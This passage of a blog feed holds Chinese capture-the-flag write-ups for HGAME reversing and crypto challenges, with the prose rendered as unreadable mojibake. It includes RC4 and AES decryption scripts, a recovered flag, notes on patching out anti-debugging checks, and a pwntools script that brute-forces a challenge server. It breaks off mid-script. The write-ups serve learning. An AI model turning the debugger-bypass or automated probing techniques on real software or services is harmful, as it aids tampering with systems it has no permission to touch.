punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token class-name">uint8_t</span> result<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x4D</span><span class="token punctuation">,</span><span class="token number">0xAF</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">,</span><span class="token number">0xAD</span><span class="token punctuation">,</span>
                          <span class="token number">0xE1</span><span class="token punctuation">,</span><span class="token number">0xEC</span><span class="token punctuation">,</span><span class="token number">0x6D</span><span class="token punctuation">,</span><span class="token number">0xDA</span><span class="token punctuation">,</span>
                          <span class="token number">0xF0</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0x5E</span><span class="token punctuation">,</span><span class="token number">0x9A</span><span class="token punctuation">,</span>
                          <span class="token number">0x9E</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0xFA</span><span class="token punctuation">,</span><span class="token number">0xBE</span><span class="token punctuation">,</span>
                          <span class="token number">0x6B</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0xC8</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token class-name">uint8_t</span> flag<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        v7 <span class="token operator">=</span> <span class="token punctuation">(</span>v7<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>
        v6 <span class="token operator">=</span> <span class="token punctuation">(</span>string_0<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token operator">+</span>v6<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>
        <span class="token function">exchange_a_byte</span><span class="token punctuation">(</span>string_0<span class="token operator">+</span>v7<span class="token punctuation">,</span>string_0<span class="token operator">+</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
        flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>string_0 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>string_0<span class="token operator">+</span>v6<span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>string_0<span class="token operator">+</span>v7<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token comment">//    for(int i = 0;i &lt; 256;i++)&#123;</span>
<span class="token comment">//        if(i%16 == 0 &amp;&amp; i!= 0)</span>
<span class="token comment">//            printf("\n");</span>
<span class="token comment">//        printf("%x ",string_0[i]);</span>
<span class="token comment">//    &#125;</span>

<span class="token comment">//    putchar('\n');</span>
<span class="token comment">//    for(int i = 0;i&lt;20;i++)&#123;</span>
<span class="token comment">//        printf("%x ",flag[i]);</span>
<span class="token comment">//    &#125;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">20</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02d "</span><span class="token punctuation">,</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//HGAME&#123;6-K4K.4R+3C4T&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>åœ¨è¿™ä¸ªé¢˜ç›®ä¸­ä¹Ÿæœ‰å¾ˆå¤šå¯ä»¥è®¨è®ºçš„åœ°æ–¹ï¼Œæ¯”å¦‚åœ¨TLSå‡½æ•°ä¸­å¯ä»¥åšæ‰‹è„šï¼Œæ£€æµ‹intæ–­ç‚¹ç­‰ç­‰ï¼Œå¯¹äºdumpé‚£å—å†…å­˜æœ€ç¨³å¦¥çš„åŠæ³•æ˜¯ä¿®æ”¹ç¨‹åºæµï¼Œä¼¼ä¹å¯ä»¥ç”¨dllæ³¨å…¥çš„æ–¹æ³•ï¼Œä¸è¿‡é‚£ä¸ªå¾’æ‰‹æ“ä½œç¡®å®æ¯”è¾ƒå¤æ‚åˆ°ç°åœ¨æˆ‘ä¹ŸæŒæ¡çš„ä¸å¥½ï¼ˆè€æ˜¯ç®—é”™åœ°å€ã€‚ã€‚ã€‚ï¼‰åœ¨WndProcä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°å…¶ä¸­å¯¹è¾“å…¥çš„ä¸€äº›æ“ä½œï¼Œä½†æ˜¯æˆ‘ç»ˆç©¶ä¸æ¸…æ¥šå®ƒçš„WM_COMMONDè·‘å“ªå»äº†ï¼Œé‚£äº›æŒ‰é’®ç©¶ç«Ÿåœ¨å“ªå®ç°çš„ï¼Œè¿™ç‚¹å¾ˆå¥‡æ€ªã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/HelloRe35.jpg" alt="5"></p>
<p>æˆ‘è¿˜æ‰¾åˆ°äº†å¦å¤–çš„ä¸€ä¸ªswitchåˆ†æ”¯<em><strong>sub_1401CC620</strong></em>ï¼Œä½†æ˜¯å¾ˆè¿·æƒ‘ï¼Œåªæ˜¯ç»è¿‡åŠ¨æ€è°ƒè¯•çŸ¥é“äº†å®ƒåœ¨æŒ‰é’®æŒ‰ä¸‹çš„æ—¶å€™èµ°çš„defaultè·¯çº¿ã€‚åœ¨å…¶ä¸­è¿˜æœ‰å¯¹xmm0ï¼Œxmm1è¿™äº›å¯„å­˜å™¨çš„æ“ä½œï¼Œåº”è¯¥æ˜¯ç»è¿‡ä¼˜åŒ–åå¾—åˆ°çš„ç»“æœã€‚</p>
<p>markï¼šrep stosbå°±æ˜¯ä»EDIæ‰€æŒ‡çš„å†…å­˜å¼€å§‹ï¼Œå°†è¿ç»­çš„ECXä¸ªå­—èŠ‚å†™æˆALçš„å†…å®¹ï¼Œå¤šç”¨äºæ¸…é›¶ç­‰ï¼Œæ¯æ¬¡é‡åˆ°è¿™ä¸ªéƒ½ä¼šå¿˜ï¼Œç„¶åé‡æ–°æŸ¥ï¼Œå°±åƒmovsxï¼Œmovssè¿™äº›æŒ‡ä»¤ä¸€æ ·ã€‚</p>
<p>è¿˜æœ‰ä¸€ç‚¹ï¼Œç¨‹åºä¸­å¾ˆå®¹æ˜“äº§ç”Ÿ[addr] &#x3D; ??? ä¹Ÿå°±æ˜¯åœ°å€å†™å…¥çš„æ—¶å€™å‡ºå¼‚å¸¸ï¼Œè¿™ç§æ—¶å€™x64dbgå¯ä»¥ç”¨shift+f9å¿½ç•¥å¼‚å¸¸ï¼Œä¹Ÿå¯ä»¥åœ¨é€‰é¡¹ä¸­ç›´æ¥æŠŠå¯¹åº”å¼‚å¸¸çš„ä»£ç å¿½ç•¥æ‰ï¼ˆå»ºè®®è¿™æ ·åšï¼‰</p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h4><p>å’Œä¹‹å‰ä¸€æ ·,,,è¿™ç®—æ˜¯ç™½å«–flagå˜›,,,éƒ½æœ‰ç‚¹ä¸å¥½æ„æ€äº†</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/rsa1.jpg" alt="2"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/rsa2.jpg" alt="1"></p>
<p>ä¸è¿‡é‚£ä¸ªç½‘ç«™ä¹Ÿåˆ†å‡ºäº†ç´ æ•°</p>
]]></content>
      <categories>
        <category>HGAME</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>HGAME</tag>
      </tags>
  </entry>
  <entry>
    <title>HGAME_WEEK2_WP</title>
    <url>/2021/03/14/HGAME_WEEK2_WP/</url>
    <content><![CDATA[<h2 id="WEEK2-WriteUp"><a href="#WEEK2-WriteUp" class="headerlink" title="WEEK2-WriteUp"></a>WEEK2-WriteUp</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><h4 id="ezapk"><a href="#ezapk" class="headerlink" title="ezapk"></a>ezapk</h4><p>ä¸ºäº†åšè¿™ä¸ªé¢˜ç›®æˆ‘æ‰¾äº†å¥½å¤šå¥½å¤šå·¥å…·ToT</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/week2-1.jpg" alt="jpg"></p>
<p>æœ€åå…è´¹çš„æˆ‘æ¨èjadx æˆ–è€…jeb demoã€‚ä¸è¿‡jadxæœ‰äº›åœ°æ–¹è¿˜æ˜¯åç¼–è¯‘ä¸å‡ºæ¥ï¼Œå¾ˆéš¾çœ‹æ‡‚ï¼Œä¼¼ä¹æ˜¯å’Œç±»å‹æœ‰å…³çš„éƒ¨åˆ†ã€‚æœ€åä¸€ä¸ªèƒ½æ‰“çš„éƒ½æ²¡æœ‰ï¼Œæœ€åè·‘å»æ‰¾åˆ°äº† jeb proç”¨ã€‚ç›¸å½“çš„ç»™åŠ›ï¼Œè™½ç„¶è¿™é“é¢˜ç†è®ºä¸Šå¯ä»¥çœ‹å­—èŠ‚ç ï¼Œä¹Ÿæœ‰æ•™ç¨‹è®²javaçš„å­—èŠ‚ç ï¼Œä½†æ˜¯â€”â€”æ­£ç»äººè°çœ‹å­—èŠ‚ç å‘€ï¼</p>
<p>åœ¨ä»˜è´¹é¢å‰ï¼Œä¸€ä¸ªèƒ½æ‰“çš„éƒ½æ²¡æœ‰&#x2F;doge(</p>
<p>åœ¨é€†çš„è¿‡ç¨‹ä¸­æ‰¾åˆ°â€œAgain?â€å­—ç¬¦ä¸²ï¼Œå®šä½åˆ°buttonçš„æ–¹æ³•ä¸Š</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/QQ%E6%88%AA%E5%9B%BE20210210003528.jpg" alt="QQæˆªå›¾20210210003528"></p>
<p>ç»è¿‡ä¸€ç•ªè°ƒæ•™ï¼Œæ‰¾åˆ°MainActivity.sæ˜¯ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œç»§ç»­æŒ–æ˜ã€‚æ‰¾åˆ°</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/s.jpg" alt="s"></p>
<p>ç”¨çš„AES-CBCï¼Œkeyæ˜¯SHA-256(â€œA_HIDEN_KEYâ€)ï¼ŒIVæ˜¯MD5(â€œA_HIDEN_KEYâ€)ï¼Œä¸Šè„šæœ¬å’¯</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> absolute_import<span class="token punctuation">,</span> division<span class="token punctuation">,</span> unicode_literals
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> binascii <span class="token keyword">import</span> unhexlify
<span class="token keyword">import</span> base64

<span class="token keyword">def</span> <span class="token function">aes_encrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">,</span>_IV<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> _IV<span class="token punctuation">)</span>
    <span class="token keyword">return</span> cryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">aes_decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">,</span>_IV<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> _IV<span class="token punctuation">)</span>
    <span class="token keyword">return</span> cryptor<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    key     <span class="token operator">=</span> <span class="token string">b'A_HIDDEN_KEY'</span>
    flag <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">b'EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY'</span><span class="token punctuation">)</span>
    sec_key <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    _IV     <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"key : "</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sec_key : "</span><span class="token punctuation">,</span>sec_key<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"_IV : "</span><span class="token punctuation">,</span>_IV<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag : "</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span>
    content <span class="token operator">=</span> aes_decrypt<span class="token punctuation">(</span>flag<span class="token punctuation">,</span>sec_key<span class="token punctuation">,</span>_IV<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>å…¶å®è¿™é“é¢˜å¯ä»¥å†æ··æ·†ä¸€ä¸‹ï¼Œä¸è¿‡æ¯•ç«Ÿæ˜¯ezapkï¼Œé¦–æ¬¡æ¥è§¦ç¡®å®å¤´ç–¼ï¼Œè¿˜æœ‰åŠ å£³çš„ï¼ŒåŸºæœ¬å¥—è·¯åº”è¯¥å’Œpeçš„ä¸€äº›æ“ä½œç±»ä¼¼ã€‚</p>
<h4 id="helloRe2"><a href="#helloRe2" class="headerlink" title="helloRe2"></a>helloRe2</h4><p>è¿™é“é¢˜æœ‰å‡ ä¸ªç‚¹æˆ‘æ–°è§åˆ°çš„ï¼Œä¸€ä¸ªæ˜¯Open-Mapingï¼Œä¼¼ä¹æ˜¯å¯ä»¥å…±äº«ä¸€æ®µå†…æ ¸å†…å­˜çš„ï¼Œå¯ä»¥ç”¨äºè¿›ç¨‹é—´çš„é€šä¿¡ï¼Œå’Œtubeæœ‰ç‚¹åƒã€‚ä¹‹æ‰€ä»¥å¡äº†å¾ˆä¹…æ˜¯å› ä¸ºä¸¥é‡ç¡çœ ä¸è¶³ï¼ˆå“‡æˆ‘å‡½æ•°å‚æ•°çœ‹æ­ªäº†ç›´æ¥è¿›è¡Œä¸€ä¸ªè°ƒè¯•çš„é‡æ–°ï¼‰åŠ¨æ€è°ƒè¯•ç”¨çš„x32dbgï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªchildProcessçš„æ’ä»¶ï¼Œåœ¨createProcessçš„æ—¶å€™å¯ä»¥è°ƒè¯•äº§ç”Ÿçš„è¿›ç¨‹ï¼Œä¸è¿‡ä¼¼ä¹æ˜¯åœ¨ResumeThreadå’ŒSleepæ‰§è¡Œå®Œäº†ä¹‹åï¼Œè¿™é‡Œä¹Ÿä¸æ¸…æ¥šä¸ºä»€ä¹ˆï¼ŒæŒ–äº†ä¸€ä¸ªå‘ã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">OpenFileMappingA  <span class="token comment">//è¿™ä¸ªå‡½æ•°åªæœ‰åœ¨ CreateFileMappingA ä¹‹åæ‰èƒ½æœ‰æ•ˆè°ƒç”¨ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªå‡½æ•°æ²¡æœ‰æˆæœï¼Œå…¶å­è¿›ç¨‹åœ¨çˆ¶è¿›ç¨‹è°ƒç”¨äº†CreateFileMappingAä¹‹åæ‰è°ƒç”¨æˆæœè¿›å…¥äº†password2</span>
MapViewOfFile
IsDebuggerPresent <span class="token comment">//è¿™ä¸ªç®—å¾ˆå¸¸è§äº†ï¼Œä¸€èˆ¬éƒ½è¦åœ¨å¯¼å…¥å‡½æ•°é‡Œé¢çœ‹ä¸€ä¸‹ï¼Œæœ‰çš„è¯è¦ä¹ˆè°ƒè¯•çš„æ—¶å€™æ”¹ä¸€ä¸‹flagï¼Œè¦ä¹ˆç›´æ¥æŠŠè¿™ä¸ªå‡½æ•°nopæ‰ï¼Œç„¶åeax = 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<p>è¿™é‡Œæ¶‰åŠäº†SSE2æŒ‡ä»¤ï¼Œå¯ä»¥è¯´åˆæ˜¯æˆ‘çš„çŸ¥è¯†ç›²åŒºäº†ï¼Œä¸è¿‡æŸ¥ä¸€ä¸‹ä¹ŸæŒºå¿«ï¼Œè¿™ä¸ªæŒ‡ä»¤è¿˜æŒºå¥½ç”¨çš„æ¥ç€ã€‚</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movdqa  xmm0, xmmword_4043A0
pcmpeqb xmm0, ds:xmmword_4030F0
pmovmskb eax, xmm0
cmp     ax, 0FFFFh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<p>ç¬¬ä¸€ä¸ªpasswordå¾ˆå¥½æ‰¾åˆ°çš„ï¼ŒåŠ¨æ€è°ƒè¯•åˆ°ä¸Šé¢è¿™æ®µï¼Œç¿»ä¸€ä¸‹å†…å­˜ï¼Œå•ªçš„ä¸€ä¸‹ï¼Œä»–å°±å‡ºæ¥äº†ã€‚</p>
<p>ç¬¬äºŒä¸ªpasswordå°±éº»çƒ¦äº†ï¼Œè™½ç„¶ä»ä»¥ä¸‹ç¬¬ä¸€ä¸ªå‡½æ•°ä¸­èƒ½å¾—åˆ°æ˜¯AESï¼Œå…¶å®è¿™æ ·å°±ç®€å•äº†ï¼Œä¸è¿‡æˆ‘çš„ç¡çœ å›°ä¹çŠ¯äº†ï¼Œå‚æ•°çœ‹é”™ä½ç½®ï¼Œç›´æ¥è¿›è¡Œä¸€ä¸ªæ—¶é—´çš„æµªè´¹ã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">BCryptOpenAlgorithmProvider</span><span class="token punctuation">(</span>pt<span class="token punctuation">,</span><span class="token string">"AES"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
BCryptSetProperty
BCryptGetProperty
BCryptGenerateSymmetricKey
BCryptExportKey
BCryptEncrypt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>å¯æ°”çš„æ˜¯<strong>BCryptEncrypt</strong>è°ƒç”¨äº†ä¸¤æ¬¡ï¼Œæ²¡ä»”ç»†çœ‹ç›´æ¥ä¸Šå½“ï¼Œç¬¬ä¸€ä¸ªåªæ˜¯ä¸ºäº†è·å–é•¿åº¦ï¼Œç¬¬äºŒä¸ªåˆ™æ˜¯åŠ å¯†ï¼Œæ‰¾åˆ°å‚æ•°ï¼Œç¿»ç¿»å†…å­˜ï¼Œå°±æ‰¾åˆ°äº†ã€‚è¿™é‡Œå¯¹BCryptExportKeyç›´æ¥é€‰æ‹©æ€§å¿½ç•¥ï¼Œ<strong>æˆ‘çœ‹ä¸è§ï¼Œæˆ‘çœ‹ä¸è§ï¼</strong>ï¼ˆå…¶å®æˆ‘çº ç»“äº†å¥½ä¹…ï¼Œçœ‹äº†å¥½å‡ æ¬¡æ–‡æ¡£ï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆå¤æ‚å‘¢ï¼Œå¯èƒ½æ˜¯å› ä¸ºä¸ºäº†ä¿è¯ä¼ è¾“æ—¶å€™çš„å®‰å…¨æ€§ï¼‰æœ€åä¸Šè„šæœ¬ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#python3</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">import</span> base64

BS <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size  <span class="token comment"># è¿™ä¸ªç­‰äº16</span>
mode <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC
pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span>BS<span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"\0"</span>  <span class="token comment"># ç”¨äºè¡¥å…¨key</span>
<span class="token comment"># ç”¨äºè¡¥å…¨ä¸‹é¢çš„textï¼Œä¸Šé¢ä¸¤ä¸ªç½‘å€å°±æ˜¯ç”¨ä»¥ä¸‹å½¢å¼è¡¥å…¨çš„</span>
pad_txt <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span>
unpad <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

key <span class="token operator">=</span> <span class="token string">'\x32\x63\x32\x60\x31\x60\x30\x66\x3B\x68\x38\x3B\x6E\x3C\x36\x36'</span> <span class="token comment"># the length can be (16, 24, 32)  # key</span>
text <span class="token operator">=</span> <span class="token string">'http://www.baidu.com/'</span>  <span class="token comment"># åŠ å¯†æ–‡æœ¬</span>
vi <span class="token operator">=</span> <span class="token string">'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f'</span>   <span class="token comment"># åç§»é‡</span>

cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> vi<span class="token punctuation">)</span>
encrypted <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad_txt<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#é€šè¿‡aesåŠ å¯†åï¼Œå†base64åŠ å¯†</span>
encrypted <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span>

encrypted <span class="token operator">=</span> b'\xB7\xFE\xFE\xD9\x07\x76\x79\x65\x3F\x4E\
                \x5F\x62\xD5\x02\xF6\x7E\x32\x62\x30\x63\
                \x35\x65\x36\x61\x33\x61\x32\x30\x62\x31\x38\x39'
cryptor<span class="token operator">=</span>AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span>mode<span class="token punctuation">,</span> vi<span class="token punctuation">)</span>
<span class="token comment"># è§£å¯†ï¼Œè§£å¯†åtextæ–‡æœ¬ä¼šåŒ…å«ç”¨æ¥è¡¥å…¨çš„å­—ç¬¦</span>
plain_text  <span class="token operator">=</span> cryptor<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>plain_text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><img src="file:///D:/HGAME/week2/2-re/shared-memory/QQ%E6%88%AA%E5%9B%BE20210208153451.jpg" alt="QQæˆªå›¾20210208153451"></p>
<p>è¿™ä¸ªæ˜æ–‡ä¹Ÿæ˜¯ç¨€å¥‡å¤æ€ªï¼Œåé¢ä¸€æ®µå•¥ä¹Ÿä¸çŸ¥é“ã€‚ç»“æœåªå–çš„å‰é¢2333.</p>
<h4 id="fake-debugger-beta"><a href="#fake-debugger-beta" class="headerlink" title="fake_debugger beta"></a>fake_debugger beta</h4><p>å†™ç€debuggerä½†æˆ‘è§‰å¾—åº”è¯¥æ˜¯ä¸€ä¸ªå†…æ•›æ±‡ç¼–ï¼Œç”¨äºè¾“å‡ºå½“æ—¶çš„eaxï¼Œebxï¼Œecxï¼Œzfç­‰å€¼ã€‚æ¯ä¸€ä¸ªecxæ ‡å¿—ç€ä¸€ä¸ªå¾ªç¯ä¸‹ï¼Œeaxåº”è¯¥æ˜¯å‡½æ•°è¿”å›å€¼ï¼Œç¬¬ä¸€ä¸ªebxåº”è¯¥æ˜¯åŠ å¯†æ—¶æ³„éœ²çš„å€¼ï¼Œç¬¬äºŒä¸ªebxæ—¶è¦æ¯”è¾ƒæ—¶ä»flagé‚£å–å‡ºæ¥çš„ã€‚ç”±æ­¤å¯çŸ¥é“flag[i] &#x3D; ebx[-1]^ebx[-2]</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> re
<span class="token keyword">import</span> string

<span class="token keyword">def</span> <span class="token function">burp</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>times<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> text
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"101.132.177.131"</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>string<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">" \n"</span><span class="token operator">*</span>times<span class="token punctuation">)</span>
    text <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
    <span class="token comment">#print(text)</span>
